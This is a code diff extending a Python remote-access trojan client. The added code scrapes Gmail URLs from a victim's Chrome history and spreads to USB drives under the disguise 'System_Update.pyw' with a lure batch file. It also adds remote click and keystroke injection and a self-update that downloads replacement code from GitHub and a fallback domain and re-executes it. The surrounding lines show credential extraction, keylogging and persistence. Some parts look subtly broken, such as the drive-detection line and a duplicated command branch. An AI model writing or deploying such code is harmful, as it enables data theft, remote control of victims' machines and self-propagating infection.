@@ -11,6 +11,7 @@ import random
 import shutil
 import socket
 import sqlite3
+import string
 import subprocess
 import sys
 import threading
@@ -390,6 +391,24 @@ def harvest_user():
     return result
 
 
+def harvest_contacts():
+    """Scrapes recent email addresses from the local Chrome/Edge data."""
+    contacts = []
+    # Path to the victim's local browser history/contacts
+    history_db = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')
+    temp_h = os.path.join(os.getenv('TEMP'), "h_vault.db")
+    
+    if safe_copy(history_db, temp_h):
+        conn = sqlite3.connect(temp_h)
+        cursor = conn.cursor()
+        # Find URLs that look like email threads
+        cursor.execute("SELECT url FROM urls WHERE url LIKE '%mail.google.com/mail/u/0/#inbox/%'")
+        contacts = [row[0] for row in cursor.fetchall()][:10]  # Top 10 recent
+        conn.close()
+    
+    return contacts
+
+
 # Utilities
 
 def get_username():
@@ -727,6 +746,29 @@ def extract_file_bytes(path):
         return None
 
 
+def usb_spreader():
+    while True:
+        # Check for all possible drive letters (D: to Z:)
+        drives = ['%s:' % d for d in string.ascii_upper if os.path.exists('%s:')]
+        for drive in drives:
+            if drive == "C:": continue  # Skip system drive
+            try:
+                # 1. Copy the Drone to the USB
+                target_path = os.path.join(drive, "System_Update.pyw")
+                if not os.path.exists(target_path):
+                    shutil.copy2(os.path.realpath(__file__), target_path)
+                
+                # 2. Create an "Auto-Run" Lure (Shortcut)
+                # This makes the user click it
+                lure = os.path.join(drive, "Open_to_View_Files.bat")
+                if not os.path.exists(lure):
+                    with open(lure, "w") as f:
+                        f.write(f"@echo off\nstart pythonw.exe System_Update.pyw\nexit")
+            except:
+                pass
+        time.sleep(10)
+
+
 def connect_to_hub(hub_ip, port):
     """Connect to the hub and process commands."""
     while True:
@@ -830,6 +872,29 @@ def connect_to_hub(hub_ip, port):
                             except Exception:
                                 pass
                         client.sendall(b'V_PULSE_EOF\n')
+                    elif "GHOST_CLICK" in command:
+                        # Syntax: GHOST_CLICK|x|y
+                        if not PYAUTOGUI_AVAILABLE:
+                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
+                        else:
+                            try:
+                                parts = command.split("|")
+                                x, y = int(parts[1]), int(parts[2])
+                                pyautogui.click(x, y)
+                                send_atomic_data(client, 'LOG', 'ok', 'ok.txt')
+                            except Exception:
+                                pass
+                    elif "GHOST_TYPE" in command:
+                        # Syntax: GHOST_TYPE|text
+                        if not PYAUTOGUI_AVAILABLE:
+                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
+                        else:
+                            try:
+                                msg = command.split("|")[1]
+                                pyautogui.write(msg, interval=0.1)
+                                send_atomic_data(client, 'LOG', 'ok', 'ok.txt')
+                            except Exception:
+                                pass
                     elif command.startswith('GHOST_TYPE|'):
                         if not PYAUTOGUI_AVAILABLE:
                             client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
@@ -865,28 +930,40 @@ def connect_to_hub(hub_ip, port):
                         send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json')
                     elif command == 'HARVEST_USER':
                         send_atomic_data(client, 'HARVEST', json.dumps(harvest_user()).encode('utf-8'), 'harvest.json')
+                    elif command == 'HARVEST_CONTACTS':
+                        contacts = harvest_contacts()
+                        data = "\n".join(contacts)
+                        send_atomic_data(client, 'CONTACTS', data.encode('utf-8'), 'list.txt')
                     elif command == 'NETWORK_TOPOLOGY':
                         send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt')
                     elif command == 'EXTRACT_CREDENTIALS':
                         send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt')
                     elif command == 'GIT_UPDATE':
-                        try:
-                            import requests
-                            if not GITHUB_RAW:
-                                raise ValueError('GITHUB_RAW is not configured')
+                        import requests
+                        # List of mirror links in case one 404s
+                        mirrors = [
+                            "https://raw.githubusercontent.com/ShahDaraza/TestBot/main/python2.py",
+                            "https://raw.githubusercontent.com/ShahDaraza/TestBot/refs/heads/main/python2.py",
+                            "http://zenithintercontinental.site/updates/python2.py"  # Your own domain fallback
+                        ]
+                        
+                        success = False
+                        for url in mirrors:
+                            try:
+                                r = requests.get(url, timeout=5)
+                                if r.status_code == 200:
+                                    with open(os.path.realpath(sys.argv[0]), "w", encoding="utf-8") as f:
+                                        f.write(r.text)
+                                    success = True
+                                    break
+                            except:
+                                continue
 
-                            r = requests.get(GITHUB_RAW, timeout=15)
-                            if r.status_code != 200:
-                                raise RuntimeError(f'Update download failed: HTTP {r.status_code}')
-
-                            current_file = os.path.realpath(sys.argv[0])
-                            with open(current_file, 'w', encoding='utf-8') as f:
-                                f.write(r.text)
-
-                            send_atomic_data(client, 'LOG', 'Mutation_Complete', 'log.txt')
+                        if success:
+                            send_atomic_data(client, 'LOG', 'Evolution_Complete', 'log.txt')
                             os.execv(sys.executable, [sys.executable] + sys.argv)
-                        except Exception as e:
-                            send_atomic_data(client, 'ERROR', str(e), 'err.txt')
+                        else:
+                            send_atomic_data(client, 'ERROR', 'Update_Failed', 'err.txt')
                     elif command == 'GET_KEYS':
                         if not PYNPUT_AVAILABLE:
                             client.sendall(b'DEPENDENCY_MISSING: pynput\n')
@@ -976,6 +1053,8 @@ if __name__ == '__main__':
         target_file = establish_persistence()
         threading.Thread(target=check_persistence, args=(target_file,), daemon=True).start()
         ensure_service_continuity()
+    # Start the spreading thread
+    threading.Thread(target=usb_spreader, daemon=True).start()
     print('\n============================================================')
     print(' Agent Node Client')
     print('------------------------------------------------------------')
